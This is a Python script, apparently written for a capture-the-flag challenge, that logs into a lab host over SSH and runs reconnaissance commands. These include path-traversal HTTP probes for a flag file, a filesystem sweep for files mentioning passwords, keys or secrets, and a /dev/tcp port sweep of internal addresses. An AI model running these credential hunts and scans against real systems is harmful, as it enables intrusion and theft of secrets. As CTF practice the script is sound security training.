#!/usr/bin/env python3
import paramiko, time
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect("instance.ctf.tdho.st", port=32879, username="player", password="reyalp", timeout=15)

def e(c):
    stdin, stdout, stderr = ssh.exec_command(c, timeout=8)
    time.sleep(1)
    return stdout.read().decode('utf-8', errors='ignore')

# Try ALL paths on host HTTP
print("[*] Probing HTTP services...")
for path in ['/flag.txt', '/etc/flag.txt', '/../flag.txt', '/../../etc/flag.txt', '/admin/flag.txt']:
    r = e(f"wget -qO- http://172.27.0.1{path} 2>&1")
    if 'TDHT{' in r: print(f"[FLAG] {path}:\n{r}"); break
    r = e(f"wget -qO- http://172.27.0.1:8080{path} 2>&1")
    if 'TDHT{' in r: print(f"[FLAG] :8080{path}:\n{r}"); break

# Check sync-loop.sh for clues
print("\n[*] Analyzing sync-loop...")
print(e("ps aux | grep sync"))

# Try accessing the sync volume from a different angle
print("\n[*] Checking mountpoints...")
print(e("cat /proc/mounts | grep sync"))

# Check for any exposed secrets/keys
print("\n[*] Looking for credentials...")
print(e("find /opt/mc -readable -type f -exec grep -l 'password\\|key\\|secret\\|flag' {} \\; 2>/dev/null"))

# Network scan with proper syntax
print("\n[*] Network scan...")
print(e("for i in 1 2 3 4 5; do timeout 1 bash -c 'echo >/dev/tcp/172.27.0.$i/22' 2>&1 && echo \"Host 172.27.0.$i alive\"; done 2>/dev/null"))

ssh.close()
